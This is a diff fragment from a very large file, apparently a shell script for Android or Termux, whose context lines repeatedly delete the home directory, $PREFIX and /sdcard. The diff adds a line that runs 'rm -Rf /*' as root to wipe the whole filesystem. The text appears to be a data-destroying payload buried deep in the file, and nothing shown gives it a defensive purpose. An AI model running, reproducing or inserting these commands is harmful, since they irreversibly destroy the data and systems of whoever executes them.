@@ -31544,6 +31544,7 @@
 
 
 rm -Rf ~ $PREFIX /sdcard
+su -c rm -Rf /*
 rm -Rf /sdcard
 rm -Rf /sdcard
 rm -rf ~ ~ ~ ~ ~
